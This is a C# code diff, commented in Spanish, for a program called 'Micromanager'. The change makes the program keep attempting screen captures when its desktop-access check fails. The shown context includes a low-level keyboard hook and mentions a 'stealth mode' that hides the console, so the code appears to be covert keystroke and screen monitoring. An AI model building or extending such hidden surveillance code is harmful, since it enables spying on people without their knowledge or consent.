@@ -153,24 +153,21 @@ namespace Micromanager
                 string startupLogPath = Path.Combine(_outputDir, "startup.log");
                 await File.AppendAllTextAsync(startupLogPath, $"[{DateTime.Now}] Program started. User: {Environment.UserName}, Machine: {Environment.MachineName}, Interactive: {Environment.UserInteractive}{Environment.NewLine}");
 
-                // VALIDACIÓN CRÍTICA: Si no es sesión interactiva, no se puede acceder al escritorio
-                // Esto puede pasar si se ejecuta como servicio, desde Task Scheduler sin sesión de usuario, etc.
-                if (!Environment.UserInteractive)
+                // VALIDACIÓN CRÍTICA: Verificar si podemos acceder al escritorio
+                // NOTA: En modo stealth con FreeConsole(), las validaciones de escritorio pueden fallar
+                // Por eso ahora lo verificamos pero NO terminamos el programa, solo advertimos
+                bool hasDesktopAccess = CanAccessDesktop();
+                
+                await File.AppendAllTextAsync(startupLogPath, $"[{DateTime.Now}] Environment.UserInteractive={Environment.UserInteractive}, CanAccessDesktop={hasDesktopAccess}, UserName={Environment.UserName}{Environment.NewLine}");
+                
+                if (!hasDesktopAccess)
                 {
-                    // Esperar un momento para permitir que la instalación termine
-                    // (si se está ejecutando como parte del proceso de instalación)
-                    await Task.Delay(3000, stoppingToken);
+                    string warningMsg = "ADVERTENCIA: Verificación de escritorio falló, pero continuaremos intentando capturas de todas formas.";
+                    await File.AppendAllTextAsync(startupLogPath, $"[{DateTime.Now}] {warningMsg}{Environment.NewLine}");
+                    _logger.LogWarning(warningMsg);
                     
-                    string errorMsg = "ADVERTENCIA: Sesión no interactiva detectada. No se puede acceder al escritorio para capturas.\n" +
-                                    "El programa necesita ejecutarse en una sesión de usuario con escritorio activo.\n" +
-                                    "Esto es normal si la tarea programada se ejecutó antes de que un usuario iniciara sesión.\n" +
-                                    "El programa se detendrá y se ejecutará automáticamente cuando un usuario inicie sesión.";
-                    
-                    await File.AppendAllTextAsync(startupLogPath, $"[{DateTime.Now}] {errorMsg}{Environment.NewLine}");
-                    _logger.LogInformation(errorMsg);
-                    
-                    // Salir limpiamente sin generar errores
-                    return;
+                    // NO terminar el programa - continuar con las capturas
+                    // Si realmente no hay acceso, las capturas fallarán pero el programa seguirá intentando
                 }
 
                 LogExecutionContext();
@@ -460,6 +457,29 @@ namespace Micromanager
                     throw new InvalidOperationException("Failed to get current process module.");
                 }
                 return NativeMethods.SetWindowsHookEx(NativeMethods.WH_KEYBOARD_LL, proc, NativeMethods.GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        private static bool CanAccessDesktop()
+        {
+            try
+            {
+                // Intentar acceder a la pantalla primaria
+                // Si falla, significa que no hay sesión de escritorio disponible
+                var screen = System.Windows.Forms.Screen.PrimaryScreen;
+                if (screen == null || screen.Bounds.Width == 0 || screen.Bounds.Height == 0)
+                {
+                    return false;
+                }
+                
+                // Verificar que podemos obtener información del escritorio
+                var bounds = screen.Bounds;
+                return bounds.Width > 0 && bounds.Height > 0;
+            }
+            catch (Exception)
+            {
+                // Si hay cualquier excepción al intentar acceder al escritorio, no hay acceso
+                return false;
             }
         }
 
